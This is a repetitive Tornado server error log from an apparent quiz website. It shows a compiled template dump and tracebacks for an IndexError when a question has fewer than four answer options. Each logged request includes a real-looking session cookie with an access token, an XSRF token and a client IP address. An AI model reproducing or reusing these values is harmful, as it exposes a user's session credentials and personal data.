 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505c52828e4c8548017fb431&answers=%5B3%5D&cursor=8&_xsrf=f9264186d6c24e8f894ccea5889cb617', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=f9264186d6c24e8f894ccea5889cb617; access_token=QUFBRzZsTmNzNkdjQkFHRmpUczNsdTRvU09aQ08xMG9MbzRmM3FIN2ZzaEZoTGl4QUxIN1IyQU5SdzkxbU1FTGdhNVM3cG92NExMOVZuVVRTd2VxamRqRUdrdzZ0elFQQU82ajdFYVFaRFpE|1348227580|4ed16c90e23e12952cf3f464513ab22364dec7fa; __utma=188782963.1093293577.1348227546.1348227546.1348227546.1; __utmb=188782963.5.10.1348227546; __utmc=188782963; __utmz=188782963.1348227546.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 94.72ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505c52828e4c8548017fb431&answers=%5B3%5D&cursor=8&_xsrf=f9264186d6c24e8f894ccea5889cb617', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=f9264186d6c24e8f894ccea5889cb617; access_token=QUFBRzZsTmNzNkdjQkFHRmpUczNsdTRvU09aQ08xMG9MbzRmM3FIN2ZzaEZoTGl4QUxIN1IyQU5SdzkxbU1FTGdhNVM3cG92NExMOVZuVVRTd2VxamRqRUdrdzZ0elFQQU82ajdFYVFaRFpE|1348227580|4ed16c90e23e12952cf3f464513ab22364dec7fa; __utma=188782963.1093293577.1348227546.1348227546.1348227546.1; __utmb=188782963.5.10.1348227546; __utmc=188782963; __utmz=188782963.1348227546.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 84.54ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505c52828e4c8548017fb431&answers=%5B3%5D&cursor=13&_xsrf=f9264186d6c24e8f894ccea5889cb617', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=f9264186d6c24e8f894ccea5889cb617; access_token=QUFBRzZsTmNzNkdjQkFHRmpUczNsdTRvU09aQ08xMG9MbzRmM3FIN2ZzaEZoTGl4QUxIN1IyQU5SdzkxbU1FTGdhNVM3cG92NExMOVZuVVRTd2VxamRqRUdrdzZ0elFQQU82ajdFYVFaRFpE|1348227580|4ed16c90e23e12952cf3f464513ab22364dec7fa; __utma=188782963.1093293577.1348227546.1348227546.1348227546.1; __utmb=188782963.5.10.1348227546; __utmc=188782963; __utmz=188782963.1348227546.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
